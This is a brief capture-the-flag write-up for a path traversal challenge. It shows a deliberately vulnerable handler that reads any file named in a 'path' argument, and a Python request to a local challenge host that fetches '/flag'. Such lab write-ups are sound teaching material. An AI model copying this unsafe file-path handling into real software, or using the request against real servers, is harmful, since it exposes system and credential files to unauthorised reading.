---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 9
---

## level 1

> Exploit a path traversal vulnerability

```py title="level 1 source code"
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```

As we can see from the source code, the server takes the argument given to the `path` parameter and then returns the result.

So we can just send a request with the `path` parameter set to `/flag`.

```py title="request1.py"
import requests

response = requests.get("http://challenge.localhost?path=/flag")
print(response.text)
```
